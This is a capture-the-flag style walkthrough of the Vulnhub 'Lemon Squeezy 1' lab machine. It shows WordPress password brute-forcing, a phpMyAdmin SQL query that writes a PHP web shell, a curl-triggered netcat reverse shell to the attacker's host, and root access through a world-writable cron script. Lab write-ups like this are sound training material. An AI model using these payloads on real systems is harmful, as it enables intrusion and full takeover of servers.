+++
title = "Vulnhub: Lemon Squeezy 1"
date = "2021-04-13"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Beginner", "Vulnhub", "OSCP Prep", "Directory Bruteforce", "ffuf", "WordPress", "WPScan", "PHPMyAdmin", "Cron"]
keywords = ["", ""]
description = ""
showFullContent = false
images = ["/img/lemonsqueezy1/lemon.png"]
+++

<!--more-->
{{< image src="/img/lemonsqueezy1/lemon.png" alt="" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author |
| ---------- | ------------ | ------ |
| Beginner | 26 Apr 2020 | James Hay | 

# Summary

For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing. 
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable 
script.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.191.134
Host is up (0.00014s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:FF:26:DE (VMware)
```
# Enumeration

## 80 (HTTP)

Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.

After performing a directory bruteforce using ffuf we get the following directories:

```sh
ffuf -ic -c -u 'http://192.168.191.134/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50
```

{{< image src="/img/lemonsqueezy1/lemon-1.png" alt="" position="center" style="border-radius: 8px;" >}}

Checking the /wordpress directory, we see a basic wordpress site with not much information.

{{< image src="/img/lemonsqueezy1/lemon-2.png" alt="" position="center" style="border-radius: 8px;" >}}

Performing enumeration using wpscan, the only interesting information gathered is the usernames.

```sh
wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
```

{{< image src="/img/lemonsqueezy1/lemon-3.png" alt="" position="center" style="border-radius: 8px;" >}}

Bruteforcing the credentials for each user, we discover the password of the orange user.

```sh
wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

{{< image src="/img/lemonsqueezy1/lemon-4.png" alt="" position="center" style="border-radius: 8px;" >}}

After logging into wordpress with the discovered credentials **orange:ginger**, we find another password in drafts.

{{< image src="/img/lemonsqueezy1/lemon-5.png" alt="" position="center" style="border-radius: 8px;" >}}

With this password, we are able to login to phpmyadmin as the orange user.

{{< image src="/img/lemonsqueezy1/lemon-6.png" alt="" position="center" style="border-radius: 8px;" >}}

Successful login:

{{< image src="/img/lemonsqueezy1/lemon-7.png" alt="" position="center" style="border-radius: 8px;" >}}

By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/shell.php" 
```

{{< image src="/img/lemonsqueezy1/lemon-8.png" alt="" position="center" style="border-radius: 8px;" >}}

We can then verify that we have successful command execution, by running the whoami command.

{{< image src="/img/lemonsqueezy1/lemon-9.png" alt="" position="center" style="border-radius: 8px;" >}}

# Shell as www-data

Running the below curl command we are able to get a reverse shell:

```sh
curl "http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26"
```

{{< image src="/img/lemonsqueezy1/lemon-10.png" alt="" position="center" style="border-radius: 8px;" >}}

After performing some manual local enumeration, we discover a cron job running as root. 

{{< image src="/img/lemonsqueezy1/lemon-11.png" alt="" position="center" style="border-radius: 8px;" >}}

The script being executed in the cron job is world writeable and the www-data user can write to it.

{{< image src="/img/lemonsqueezy1/lemon-12.png" alt="" position="center" style="border-radius: 8px;" >}}


# Shell as root

After changing the script to the below command we can create a bash binary with suid permissions.

```sh
#!/bin/bash
cp /bin/bash /suidbash
chmod u+s /suidbash
```

{{< image src="/img/lemonsqueezy1/lemon-13.png" alt="" position="center" style="border-radius: 8px;" >}}

Once the cron is executed we get the binary and can escalate to root shell and read root.txt.

```sh
./suidbash -p
```

{{< image src="/img/lemonsqueezy1/lemon-14.png" alt="" position="center" style="border-radius: 8px;" >}}

# Extras

 - It seems I forgot user.txt and it is in /var/www.

{{< image src="/img/lemonsqueezy1/lemon-15.png" alt="" position="center" style="border-radius: 8px;" >}}

- We could write to the wordpress folder from phpmyadmin because it was world-writeable.

{{< image src="/img/lemonsqueezy1/lemon-16.png" alt="" position="center" style="border-radius: 8px;" >}}

